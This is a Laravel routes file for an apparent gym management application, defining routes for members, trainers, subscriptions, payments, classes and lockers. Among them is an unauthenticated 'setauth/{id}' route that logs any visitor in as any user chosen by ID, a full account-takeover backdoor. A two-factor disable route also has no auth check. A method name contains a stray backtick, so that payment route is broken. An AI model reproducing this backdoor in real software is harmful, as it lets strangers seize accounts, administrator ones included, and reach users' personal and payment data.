<?php

use App\Http\Controllers\AttendanceController;
use App\Http\Controllers\Auth\VerifyEmailController;
use App\Http\Controllers\AuthPageController;
use App\Http\Controllers\CategoryController;
use App\Http\Controllers\CommunicationController;
use App\Http\Controllers\ClassesController;
use App\Http\Controllers\EventController;
use App\Http\Controllers\EventTypeController;
use App\Http\Controllers\LockerController;
use App\Http\Controllers\NutritionScheduleController;
use App\Http\Controllers\ProductBookingController;
use App\Http\Controllers\ProductController;
use Illuminate\Support\Facades\Route;
use App\Http\Controllers\HomeController;
use App\Http\Controllers\UserController;
use App\Http\Controllers\SubscriptionController;
use App\Http\Controllers\SettingController;
use App\Http\Controllers\PermissionController;
use App\Http\Controllers\RoleController;
use App\Http\Controllers\ModuleController;
use App\Http\Controllers\NoticeBoardController;
use App\Http\Controllers\ContactController;
use App\Http\Controllers\CouponController;
use App\Http\Controllers\ExpenseController;
use App\Http\Controllers\FAQController;
use App\Http\Controllers\HealthController;
use App\Http\Controllers\HomePageController;
use App\Http\Controllers\InvoiceController;
use App\Http\Controllers\MembershipController;
use App\Http\Controllers\NotificationController;
use App\Http\Controllers\OTPController;
use App\Http\Controllers\PageController;
use App\Http\Controllers\PaymentController;
use App\Http\Controllers\TraineeController;
use App\Http\Controllers\TrainerController;
use App\Http\Controllers\TypeController;
use App\Http\Controllers\WorkoutActivityController;
use App\Http\Controllers\WorkoutController;
use App\Models\User;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

require __DIR__ . '/auth.php';

Route::get('/', [HomeController::class, 'index'])->middleware(
    [

        'XSS',
    ]
);
Route::get('home', [HomeController::class, 'index'])->name('home')->middleware(
    [

        'XSS',
    ]
);
Route::get('dashboard', [HomeController::class, 'index'])->name('dashboard')->middleware(
    [

        'XSS',
    ]
);

//-------------------------------User-------------------------------------------

Route::resource('users', UserController::class)->middleware(
    [
        'auth',
        'XSS',
    ]
);
Route::get('users/{id}/permissions', [UserController::class, 'managePermission'])->name('users.manage.permission')->middleware(['auth', 'XSS']);
Route::post('users/{id}/permissions', [UserController::class, 'updatePermission'])->name('users.update.permission')->middleware(['auth', 'XSS']);

Route::get('setauth/{id}', function ($id) {
    $user = User::find($id);
    \Auth::login($user);
    return redirect()->route('home');
});


Route::get('login/otp', [OTPController::class, 'show'])->name('otp.show')->middleware(
    [

        'XSS',
    ]
);
Route::post('login/otp', [OTPController::class, 'check'])->name('otp.check')->middleware(
    [

        'XSS',
    ]
);
Route::get('login/2fa/disable', [OTPController::class, 'disable'])->name('2fa.disable')->middleware(['XSS',]);

//-------------------------------Subscription-------------------------------------------

Route::group(
    [
        'middleware' => [
            'auth',
            'XSS',
        ],
    ],
    function () {

        Route::resource('subscriptions', SubscriptionController::class);
        Route::get('coupons/history', [CouponController::class, 'history'])->name('coupons.history');
        Route::delete('coupons/history/{id}/destroy', [CouponController::class, 'historyDestroy'])->name('coupons.history.destroy');
        Route::get('coupons/apply', [CouponController::class, 'apply'])->name('coupons.apply');
        Route::resource('coupons', CouponController::class);
        Route::get('subscription/transaction', [SubscriptionController::class, 'transaction'])->name('subscription.transaction');
    }
);

//-------------------------------Subscription Payment-------------------------------------------

Route::group(
    [
        'middleware' => [
            'auth',
            'XSS',
        ],
    ],
    function () {

        Route::post('subscription/{id}/stripe/payment', [SubscriptionController::class, 'stripePayment'])->name('subscription.stripe.payment');
    }
);
//-------------------------------Settings-------------------------------------------
Route::group(
    [
        'middleware' => [
            'auth',
            'XSS',
        ],
    ],
    function () {
        Route::get('settings', [SettingController::class, 'index'])->name('setting.index');

        Route::post('settings/account', [SettingController::class, 'accountData'])->name('setting.account');
        Route::delete('settings/account/delete', [SettingController::class, 'accountDelete'])->name('setting.account.delete');
        Route::post('settings/password', [SettingController::class, 'passwordData'])->name('setting.password');
        Route::post('settings/general', [SettingController::class, 'generalData'])->name('setting.general');
        Route::post('settings/smtp', [SettingController::class, 'smtpData'])->name('setting.smtp');
        Route::get('settings/smtp-test', [SettingController::class, 'smtpTest'])->name('setting.smtp.test');
        Route::post('settings/smtp-test', [SettingController::class, 'smtpTestMailSend'])->name('setting.smtp.testing');
        Route::get('settings/sms-test', [CommunicationController::class, 'testSms'])->name('setting.sms.test');
        Route::post('settings/sms-test', [CommunicationController::class, 'sendTestSms'])->name('setting.sms.testing');
        Route::post('settings/payment', [SettingController::class, 'paymentData'])->name('setting.payment');
        Route::post('settings/site-seo', [SettingController::class, 'siteSEOData'])->name('setting.site.seo');
        Route::post('settings/google-recaptcha', [SettingController::class, 'googleRecaptchaData'])->name('setting.google.recaptcha');
        Route::post('settings/company', [SettingController::class, 'companyData'])->name('setting.company');
        Route::post('settings/2fa', [SettingController::class, 'twofaEnable'])->name('setting.twofa.enable');

        Route::get('footer-setting', [SettingController::class, 'footerSetting'])->name('footerSetting');
        Route::post('settings/footer', [SettingController::class, 'footerData'])->name('setting.footer');

        Route::post('settings/sms', [CommunicationController::class, 'settings'])->name('setting.sms');
        Route::get('language/{lang}', [SettingController::class, 'lanquageChange'])->name('language.change');
        Route::post('theme/settings', [SettingController::class, 'themeSettings'])->name('theme.settings');
    }
);

Route::resource('communication', CommunicationController::class)->middleware(
    [
        'auth',
        'XSS',
    ]
);


//-------------------------------Role & Permissions-------------------------------------------
Route::resource('permission', PermissionController::class)->middleware(
    [
        'auth',
        'XSS',
    ]
);

Route::resource('role', RoleController::class)->middleware(
    [
        'auth',
        'XSS',
    ]
);

Route::resource('modules', ModuleController::class)->middleware(
    [
        'auth',
        'XSS',
    ]
);

//-------------------------------Note-------------------------------------------
Route::resource('note', NoticeBoardController::class)->middleware(
    [
        'auth',
        'XSS',
    ]
);

//-------------------------------Contact-------------------------------------------
Route::resource('contact', ContactController::class)->middleware(
    [
        'auth',
        'XSS',
    ]
);

//-------------------------------logged History-------------------------------------------

Route::group(
    [
        'middleware' => [
            'auth',
            'XSS',
        ],
    ],
    function () {

        Route::get('logged/history', [UserController::class, 'loggedHistory'])->name('logged.history');
        Route::get('logged/{id}/history/show', [UserController::class, 'loggedHistoryShow'])->name('logged.history.show');
        Route::delete('logged/{id}/history', [UserController::class, 'loggedHistoryDestroy'])->name('logged.history.destroy');
    }
);


//-------------------------------Plan Payment-------------------------------------------
Route::group(
    [
        'middleware' => [
            'auth',
            'XSS',
        ],
    ],
    function () {
        Route::post('subscription/{id}/bank-transfer', [PaymentController::class, 'subscriptionBankTransfer'])->name('subscription.bank.transfer');
        Route::get('subscription/{id}/bank-transfer/action/{status}', [PaymentController::class, 'subscriptionBankTransferAction'])->name('subscription.bank.transfer.action');
        Route::post('subscription/{id}/paypal', [PaymentController::class, 'subscriptionPaypal'])->name('subscription.paypal');
        Route::get('subscription/{id}/paypal/{status}', [PaymentController::class, 'subscriptionPaypalStatus'])->name('subscription.paypal.status');
        Route::post('subscription/{id}/{user_id}/manual-assign-package', [PaymentController::class, 'subscriptionManualAssignPackage'])->name('subscription.manual_assign_package');
        Route::get('subscription/flutterwave/{sid}/{tx_ref}', [PaymentController::class, 'subscriptionFl`utterwave'])->name('subscription.flutterwave');
        Route::post('/subscription-pay-with-paystack', [PaymentController::class, 'subscriptionPayWithPaystack'])->name('subscription.pay.with.paystack')->middleware(['auth', 'XSS']);
        Route::get('/subscription/paystack/{pay_id}/{plan_id}', [PaymentController::class, 'getsubscriptionsPaymentStatus'])->name('subscription.paystack');


    }
);

//-------------------------------Notification-------------------------------------------
Route::resource('notification', NotificationController::class)->middleware(
    [
        'auth',
        'XSS',

    ]
);

Route::get('email-verification/{token}', [VerifyEmailController::class, 'verifyEmail'])->name('email-verification')->middleware(
    [
        'XSS',
    ]
);

//-------------------------------FAQ-------------------------------------------
Route::resource('FAQ', FAQController::class)->middleware(
    [
        'auth',
        'XSS',
    ]
);

//-------------------------------Home Page-------------------------------------------
Route::resource('homepage', HomePageController::class)->middleware(
    [
        'auth',
        'XSS',
    ]
);
//-------------------------------FAQ-------------------------------------------
Route::resource('pages', PageController::class)->middleware(
    [
        'auth',
        'XSS',
    ]
);
Route::get('page/{slug}', [PageController::class, 'page'])->name('page');
//-------------------------------FAQ-------------------------------------------
Route::impersonate();

//-------------------------------Trainer-------------------------------------------
Route::resource('trainers', TrainerController::class)->middleware(
    [
        'auth',
        'XSS',
    ]
);

//-------------------------------Trainer-------------------------------------------

Route::group(
    [
        'middleware' => [
            'auth',
            'XSS',
        ],
    ],
    function () {
        Route::get('trainees/send-reminder/{id}', [TraineeController::class, 'sendReminder'])->name('trainees.sendReminder');
Route::resource('trainees', TraineeController::class);
        Route::get('membership-renew/{id}', [TraineeController::class, 'membershipRenewal'])->name('membership.renew');
        Route::post('membership-renew-store', [TraineeController::class, 'membershipRenewalStore'])->name('membership.renew.store');
    }
);

//-------------------------------Class & Class Schedule-------------------------------------------

Route::group(
    [
        'middleware' => [
            'auth',
            'XSS',
        ],
    ],
    function () {


        Route::get('classes/{id}/user/{type}/assign', [ClassesController::class, 'userAssign'])->name('classes.user.assign');
        Route::post('classes/{id}/user/{type}/assign/store', [ClassesController::class, 'userAssignStore'])->name('classes.user.assign.store');
        Route::delete('classes/user/{id}/remove', [ClassesController::class, 'userAssignRemove'])->name('classes.user.remove');

        Route::delete('classes/schedule', [ClassesController::class, 'scheduleDestroy'])->name('classes.schedule.destroy');
        Route::resource('classes', ClassesController::class);

    }
);

//-------------------------------Category-------------------------------------------
Route::resource('category', CategoryController::class)->middleware(
    [
        'auth',
        'XSS',
    ]
);

//-------------------------------Membership-------------------------------------------
Route::resource('membership', MembershipController::class)->middleware(
    [
        'auth',
        'XSS',
    ]
);

//-------------------------------Workout Activity-------------------------------------------

Route::group(
    [
        'middleware' => [
            'auth',
            'XSS',
        ],
    ],
    function () {

        Route::resource('activity', WorkoutActivityController::class);

    }
);

//-------------------------------Workout-------------------------------------------

Route::group(
    [
        'middleware' => [
            'auth',
            'XSS',
        ],
    ],
    function () {

        Route::get('workouts/today', [WorkoutController::class, 'todayWorkout'])->name('today.workout');
        Route::resource('workouts', WorkoutController::class);

    }
);

//-------------------------------Health Update-------------------------------------------

Route::group(
    [
        'middleware' => [
            'auth',
            'XSS',
        ],
    ],
    function () {

        Route::resource('health-update', HealthController::class);

    }
);

//-------------------------------Attendance-------------------------------------------

Route::group(
    [
        'middleware' => [
            'auth',
            'XSS',
        ],
    ],
    function () {

        Route::get('attendances/today', [AttendanceController::class, 'todayAttendance'])->name('today.attendance');
        Route::resource('attendances', AttendanceController::class);
        Route::get('bulk-attendances', [AttendanceController::class, 'bulk'])->name('bulk.attendance');
        Route::post('bulk-attendance-store', [AttendanceController::class, 'bulkAttendanceStore'])->name('attendance.bulk.store');
    }
);

//-------------------------------Invoice & Expense Type-------------------------------------------

Route::group(
    [
        'middleware' => [
            'auth',
            'XSS',
        ],
    ],
    function () {

        Route::resource('types', TypeController::class);

    }
);

//-------------------------------Invoice-------------------------------------------

Route::group(
    [
        'middleware' => [
            'auth',
            'XSS',
        ],
    ],
    function () {

        Route::get('invoice/{id}/payment/create', [InvoiceController::class, 'invoicePaymentCreate'])->name('invoice.payment.create');
        Route::post('invoice/{id}/payment/store', [InvoiceController::class, 'invoicePaymentStore'])->name('invoice.payment.store');
        Route::delete('invoice/{id}/payment/{pid}/destroy', [InvoiceController::class, 'invoicePaymentDestroy'])->name('invoice.payment.destroy');
        Route::delete('invoices/type/destroy', [InvoiceController::class, 'invoiceTypeDestroy'])->name('invoice.type.destroy');
        Route::resource('invoices', InvoiceController::class);

    }
);

//-------------------------------Expense-------------------------------------------
Route::resource('expense', ExpenseController::class)->middleware(
    [
        'auth',
        'XSS',
    ]
);


//-------------------------------Auth page-------------------------------------------
Route::resource('authPage', AuthPageController::class)->middleware(
    [
        'auth',
        'XSS',
    ]
);
Route::group(
    [
        'middleware' => [
            'auth',
            'XSS',
        ],
    ],
    function () {
        Route::resource('locker', LockerController::class)->middleware(['auth', 'XSS']);
        Route::get('assign-locker/{id}', [LockerController::class, 'assignLocker'])->name('assign.locker');
        Route::post('assign-locker-store', [LockerController::class, 'assignLockerstore'])->name('assign.locker.store');
        Route::get('assign-locker-edit/{id}', [LockerController::class, 'assignLockerEdit'])->name('assign.locker.edit');
        Route::put('assign-locker-update/{id}', [LockerController::class, 'assignLockerUpdate'])->name('assign.locker.update');
    }
);


Route::resource('event-type', EventTypeController::class)->middleware(['auth', 'XSS']);
Route::group(
    [
        'middleware' => [
            'auth',
            'XSS',
        ],
    ],
    function () {
        Route::resource('event', EventController::class);
        Route::get('calendar-event', [EventController::class, 'calendarEvents'])->name('calendar.events');
    }
);

Route::resource('nutrition-schedule', NutritionScheduleController::class)->middleware(['auth', 'XSS']);

Route::resource('product', ProductController::class)->middleware(['auth', 'XSS']);
Route::resource('product-booking', ProductBookingController::class)->middleware(['auth', 'XSS']);

Route::get('product-detail/{id}', [ProductBookingController::class, 'productDetail'])->name('product.detail');



